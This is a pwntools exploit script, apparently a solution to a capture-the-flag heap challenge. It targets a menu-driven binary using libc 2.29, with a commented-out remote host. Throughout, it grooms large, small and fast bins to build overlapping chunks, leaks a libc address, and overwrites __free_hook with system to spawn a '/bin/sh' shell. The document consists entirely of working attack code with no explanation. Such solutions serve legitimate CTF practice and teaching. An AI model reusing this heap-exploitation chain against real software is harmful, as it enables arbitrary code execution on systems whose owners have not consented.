from pwn import*
context.log_level ='DEBUG'
def new(size,content):
	p.sendlineafter('>','1')
	p.sendlineafter('length :',str(size))
	p.sendafter('them!',content)
def free(index):
	p.sendlineafter('>','2')
	p.sendlineafter('debuff :',str(index))
def show(index):
	p.sendlineafter('>','3')
	p.sendlineafter('blessing :',str(index))
p = process('./main')
#p = remote('183.129.189.60',10106)
libc =ELF('./libc-2.29.so')
for i in range(4):
	new(0x1000,'FMYY')
new(0x1000-0x3E0,'FMYY')
#--large bin
for i in range(7):
	new(0x28,'FMYY')

new(0xB20,'FAKE')
new(0x10,'FMYY')
free(12)

new(0x1000,'FMYY')
gdb.attach(p)
new(0x28,p64(0) + p64(0x521) + '\x40')
#--

#-- small bin 
new(0x28,'F') #15
new(0x28,'M') #16
new(0x28,'Y') #17
new(0x28,'Y') #18

for i in range(7): #5 - 11
	free(5+i)

free(17)
free(15)

for i in range(7):
	new(0x28,'FMYY')

new(0x400,'FMYY')

new(0x28,p64(0) + '\x20')

new(0x28,'clear') # clear the small bin
#--

#--fast bin
for i in range(7):
	free(5 + i)
free(16)
free(14)

for i in range(7):
	new(0x28,'FMYY')

new(0x28,'\x20')
new(0x28,'clear')
#--
new(0x28,'Target') #20
new(0x5F8,'Last')
#new(0x100,'FMYY')
free(20)
new(0x28,'\x00'*0x20 + p64(0x520))
free(21)

new(0x40,'FMYY')
show(16)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x60 -0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
rce = libc_base + 0x106EF8
system = libc_base + libc.sym['system']
free(21)
free(14)

new(0x28,'\x00'*0x10 + p64(free_hook))

new(0x40,'/bin/sh\x00')
new(0x40,p64(system))

free(21)
p.interactive()
